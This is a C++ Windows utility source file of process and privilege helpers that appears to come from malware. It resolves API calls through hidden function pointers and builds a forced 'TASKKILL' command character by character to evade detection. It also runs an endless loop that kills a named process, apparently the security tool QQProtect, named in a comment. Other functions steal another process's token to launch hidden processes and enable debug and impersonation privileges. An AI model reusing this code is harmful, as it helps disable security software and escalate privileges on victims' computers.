
#include "Utils.h"

#include <iostream>
#include <tlhelp32.h>
#include "json/json.h"
#include <string>
#include <fstream>
#include <iostream>
#include <UserEnv.h>
#include <ShlObj.h>

#include "api.h"
#include "StrHelper.h"

#pragma comment(lib,"userenv.lib")
#pragma comment(lib,"Shell32.lib")
#pragma comment(lib, "zlib.lib")

using namespace std;


int IsSystemPrivilege()
{
	char szPath[MAX_PATH] = { 0 };
	if (SHGetSpecialFolderPathA(NULL, szPath, CSIDL_APPDATA, TRUE))
	{
		string flag("config\\systemprofile");
		string path(szPath);
		if (path.find(flag) != std::string::npos)
		{
			return TRUE;
		}
	}

	return FALSE;
}


int isSystemDirectory() {
	char szcurdir[MAX_PATH] = { 0 };
	int ret = GetCurrentDirectoryA(MAX_PATH, szcurdir);
	if (_stricmp(szcurdir + 1, ":\\Windows\\system32") == 0)
	{
		return TRUE;
	}

	return FALSE;
}


int CreateProcessByToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR szparam)
{
	int ret = 0;
	HANDLE hToken = 0;

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	for (lpProcess32First(hProcessSnap, &pe32); lpProcess32Next(hProcessSnap, &pe32);)
	{
		char szParam[MAX_PATH] = { 0 };
		int iRet = lpWideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, szParam, sizeof(szParam) - 1, NULL, NULL);
		if (lstrcmpiA(_strupr(szParam), _strupr(lpTokenProcessName)) == 0) {
			HANDLE hProcess = lpOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
			if (hProcess)
			{
				ret = lpOpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
				lpCloseHandle(hProcess);
			}
			else {

			}
			break;
		}
	}

	lpCloseHandle(hProcessSnap);

	if (hToken == 0) {
		return 0;
	}

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	lplstrcpyA(si.lpDesktop, "winsta0\\default");
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	LPVOID lpEnvBlock = NULL;
	BOOL bEnv = CreateEnvironmentBlock(&lpEnvBlock, hToken, FALSE);
	DWORD dwFlags = CREATE_NEW_CONSOLE;
	if (bEnv)
	{
		dwFlags |= CREATE_UNICODE_ENVIRONMENT;
	}

	//si.dwFlags |= dwFlags;
	// 环境变量创建失败仍然可以创建进程，但会影响到后面的进程获取环境变量内容
	ret = CreateProcessAsUserA(
		hToken,
		szProcessName,
		szparam,
		NULL,
		NULL,
		FALSE,
		dwFlags,
		bEnv ? lpEnvBlock : NULL,
		NULL,
		&si,
		&pi);

	if (bEnv)
	{
		ret = DestroyEnvironmentBlock(lpEnvBlock);
	}

	return ret;
}



DWORD GetProcessIdByName(char* szProcessName)
{
	char szProcName[MAX_PATH] = { 0 };
	lplstrcpyA(szProcName, szProcessName);
	_strupr_s(szProcName, MAX_PATH);

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = 0;
	BOOL bNext = lpProcess32First(hProcessSnap, &pe32);
	while (bNext)
	{
		char szexefn[MAX_PATH] = { 0 };
		int ret = WStringToMString(pe32.szExeFile, lstrlenW(pe32.szExeFile), szexefn, MAX_PATH);
		_strupr_s(szexefn, MAX_PATH);

		if (lplstrcmpA(szProcName, szexefn) == 0)
		{
			lpCloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
		bNext = lpProcess32Next(hProcessSnap, &pe32);
	}
	lpCloseHandle(hProcessSnap);
	return FALSE;
}


DWORD getProcNameByPID(DWORD pid, char* procname, int buflen)
{
	HANDLE h = NULL;
	PROCESSENTRY32 pe = { 0 };
	DWORD ppid = 0;
	pe.dwSize = sizeof(PROCESSENTRY32);
	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(h, &pe))
	{
		do
		{
			if (pe.th32ProcessID == pid)
			{

				int len = WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, procname, buflen, 0, 0);
				if (len > 0)
				{
					procname[len] = 0;
					return len;
				}
				break;
			}
		} while (Process32Next(h, &pe));
	}
	CloseHandle(h);
	return (ppid);
}


int taskkill(char* procname) {
	char szcmd[MAX_PATH];
	char szcmdformat[] = { 'c','m','d',' ','/','c',' ','T','A','S','K','K','I','L','L',' ','/','F',' ','/','I','M',' ','%','s',0 };
	lpwsprintfA(szcmd, szcmdformat, procname);
	int ret = lpWinExec(szcmd, SW_HIDE);
	if (ret > 32)
	{
		return TRUE;
	}
	return FALSE;
}


//char szQQProtect[] = { 'q','q','p','r','o','t','e','c','t','.','e','x','e',0 };
int killByOpenProc(char* pname)
{
	while (TRUE)
	{
		DWORD dwProcID = GetProcessIdByName(pname);
		if (dwProcID)
		{
			HANDLE hProc = lpOpenProcess(PROCESS_ALL_ACCESS, 0, dwProcID);
			if (hProc)
			{
				int iRet = lpTerminateProcess(hProc, 0);
				lpCloseHandle(hProc);
			}
		}
	}
	return FALSE;
}


int EnableDebugPrivilege(HANDLE hProc, BOOL bFlag)
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!lpOpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return   FALSE;
	}
	if (!lpLookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		lpCloseHandle(hToken);
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	if (bFlag)
	{
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else
	{
		tkp.Privileges[0].Attributes = 0;
	}

	if (!lpAdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		lpCloseHandle(hToken);
		return FALSE;
	}

	lpCloseHandle(hToken);
	if (lpRtlGetLastWin32Error() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	}
	return TRUE;
}

HRESULT GetComFolder(int csidl, WCHAR* buffer)
{
	LPITEMIDLIST pidl = 0;
	HRESULT result = SHGetSpecialFolderLocation(NULL, csidl, &pidl);
	*buffer = 0;

	if (result == 0)
	{
		SHGetPathFromIDList(pidl, buffer);
		CoTaskMemFree(pidl);
	}

	return result;
}

DWORD  getPidByEnum(char* szProcessName)
{
	DWORD procId[4096] = { 0 };
	DWORD dwProcCnt = 0;

	HMODULE hMod = 0;
	DWORD dwModCnt = 0;

	char lpProcessName[MAX_PATH] = { 0 };
	lplstrcpyA(lpProcessName, szProcessName);
	_strupr_s(lpProcessName, MAX_PATH);

	char szPath[MAX_PATH] = { 0 };

	int iRet = lpEnumProcesses(procId, sizeof(procId), &dwProcCnt);
	if (iRet == 0)
	{
		return FALSE;
	}

	for (DWORD i = 0; i < dwProcCnt; ++i)
	{
		HANDLE hProc = lpOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, procId[i]);
		if (NULL != hProc)
		{
			//如果从 WOW64 上运行的 32 位应用程序调用此函数，则它只能枚举 32 位进程的模块。 
			//如果进程是 64 位进程，此函数将失败，最后一个错误代码 ERROR_PARTIAL_COPY ( 299) 。
			iRet = lpEnumProcessModules(hProc, &hMod, sizeof(hMod), &dwModCnt);
			if (iRet)
			{
				iRet = lpGetModuleBaseNameA(hProc, hMod, szPath, MAX_PATH);
				_strupr_s(szPath, MAX_PATH);
				if (lpRtlCompareMemory(szPath, lpProcessName, lplstrlenA(lpProcessName)) == lplstrlenA(lpProcessName))
				{
					lpCloseHandle(hProc);
					return procId[i];
				}
			}
			lpCloseHandle(hProc);
		}
	}
	return FALSE;
}

DWORD isPidWow64(DWORD pid) {
	BOOL wow64 = 0;
	int result = 0;
	HANDLE hprocess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
	if (hprocess)
	{
		result = IsWow64Process(hprocess, &wow64);
		CloseHandle(hprocess);
	}
	return wow64;
}

DWORD getIPstr(DWORD ip, char* strIP) {

	unsigned char* pIP = (unsigned char*)&ip;
	int len = lpwsprintfA(strIP, "%u.%u.%u.%u", pIP[0], pIP[1], pIP[2], pIP[3]);
	return len;
}


//The process that calls CreateProcessWithTokenW must have the SE_IMPERSONATE_NAME privilege
//CreateProcessAsUser must have the SE_INCREASE_QUOTA_NAME privilege and may require the SE_ASSIGNPRIMARYTOKEN_NAME privilege if the token is not assignable
int adjustPrivileges() {
	HANDLE htoken = 0;
	int result = 0;
	result = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &htoken);
	if (result) {
		DWORD s = sizeof(TOKEN_PRIVILEGES) + 2 * sizeof(LUID_AND_ATTRIBUTES);
		TOKEN_PRIVILEGES* p = (PTOKEN_PRIVILEGES)malloc(s);
		if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &(p->Privileges[0].Luid)) == 0
			||
			LookupPrivilegeValueW(NULL, SE_IMPERSONATE_NAME, &(p->Privileges[1].Luid)) == 0
			||
			LookupPrivilegeValueW(NULL, SE_INCREASE_QUOTA_NAME, &(p->Privileges[2].Luid)) == 0)
		{
			free(p);
			return FALSE;
		}
		p->PrivilegeCount = 3;
		for (unsigned long i = 0; i < p->PrivilegeCount; ++i) {
			p->Privileges[i].Luid = p->Privileges[i].Luid;
			p->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
		}
		result = AdjustTokenPrivileges(htoken, FALSE, p, s, NULL, NULL);
		int error = GetLastError();
		if (result == 0 || error != ERROR_SUCCESS) {
			free(p);
			return FALSE;
		}

		printf("AdjustTokenPrivileges success\r\n");
		free(p);
		return TRUE;
	}

	return FALSE;
}